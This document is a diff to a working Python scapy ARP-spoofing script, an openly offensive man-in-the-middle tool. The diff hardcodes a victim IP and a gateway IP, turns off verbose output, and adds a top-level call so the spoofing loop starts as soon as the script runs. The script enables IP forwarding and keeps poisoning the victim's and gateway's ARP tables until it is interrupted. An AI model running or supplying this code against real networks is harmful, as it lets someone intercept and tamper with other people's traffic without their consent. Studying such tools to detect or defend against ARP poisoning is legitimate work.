@@ -2,6 +2,7 @@ import scapy.all as scapy
 import os
 import time
 
+
 def _enable_windows_iproute():
     """
     Enables IP route (IP Forwarding) in Windows
@@ -34,6 +35,8 @@ def enable_ip_route(verbose=True):
         print("[!] IP Routing enabled.")
 
 def get_mac(ip):
+
+
     #sends arp request to ip adress
     arp_request = scapy.ARP(pdst = ip)
 
@@ -45,9 +48,12 @@ def get_mac(ip):
 
     #makes a list with all the devices who answered to the ip adress
     answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
+    print(answered_list)
     
     #returns the mac adress stored in answered lists
-    return answered_list[0][1].hwsrc 
+    if answered_list:
+    	return answered_list[0][1].hwsrc 
+
 
 def spoof(spoof_ip, target_ip):
     target_mac = get_mac(target_ip)
@@ -65,13 +71,15 @@ def restore(spoof_ip, target_ip):
     scapy.send(restore_request, verbose = 0)
 
 def arp_spoof():
-    verbose = True
+    verbose = False
     #fill in the ip-adress of the victim
-    target = ""
-    #fill in the ip-adress of the host, probably your own!
-    host = ""
+    target = "192.168.2.103"
+    #fill in the ip-adress of the host, your ip-adress!
+    host = "192.168.2.1"
     #enable ip-routing 
+    
     enable_ip_route()
+    
     if host != "" and target != "":
         try: 
             while True:
@@ -83,4 +91,6 @@ def arp_spoof():
             restore(target, host)
             restore(host, target)
             print("ARP tables restored!")
+
+arp_spoof()
 
